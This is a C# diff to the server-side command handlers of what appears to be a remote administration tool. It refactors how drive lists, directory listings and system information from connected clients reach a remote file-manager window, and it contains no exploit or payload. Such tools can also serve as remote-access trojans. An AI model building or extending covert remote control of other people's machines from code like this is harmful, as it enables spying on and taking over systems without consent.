@@ -3,13 +3,13 @@ using System.IO;
 using System.Text;
 using System.Threading;
 using System.Windows.Forms;
+using xServer.Core.Data;
 using xServer.Core.Helper;
 using xServer.Core.Networking;
 using xServer.Core.Packets.ClientPackets;
 using xServer.Core.Utilities;
 using xServer.Enums;
 using xServer.Forms;
-using xServer.Settings;
 
 namespace xServer.Core.Commands
 {
@@ -30,7 +30,10 @@ namespace xServer.Core.Commands
             }
 
             if (client.Value != null && client.Value.FrmFm != null)
+            {
                 client.Value.FrmFm.AddDrives(drives);
+                client.Value.FrmFm.SetStatus("Ready");
+            }
         }
 
         public static void HandleGetDirectoryResponse(Client client, GetDirectoryResponse packet)
@@ -40,11 +43,8 @@ namespace xServer.Core.Commands
 
             new Thread(() =>
             {
-                lock (_isAddingLock)
-                {
-                    if (_isAdding) return;
-                    _isAdding = true;
-                }
+                if (client.Value.ProcessingDirectory) return;
+                client.Value.ProcessingDirectory = true;
 
                 client.Value.FrmFm.ClearFileBrowser();
 
@@ -98,11 +98,11 @@ namespace xServer.Core.Commands
                 }
 
                 if (client.Value != null)
-                    client.Value.LastDirectorySeen = true;
-
-                lock (_isAddingLock)
                 {
-                    _isAdding = false;
+                    client.Value.ReceivedLastDirectory = true;
+                    client.Value.ProcessingDirectory = false;
+                    if (client.Value.FrmFm != null)
+                        client.Value.FrmFm.SetStatus("Ready");
                 }
             }).Start();
         }
@@ -112,7 +112,7 @@ namespace xServer.Core.Commands
             if (packet.SystemInfos == null)
                 return;
 
-            if (XMLSettings.ShowToolTip)
+            if (Settings.ShowToolTip)
             {
                 var builder = new StringBuilder();
                 for (int i = 0; i < packet.SystemInfos.Length; i += 2)
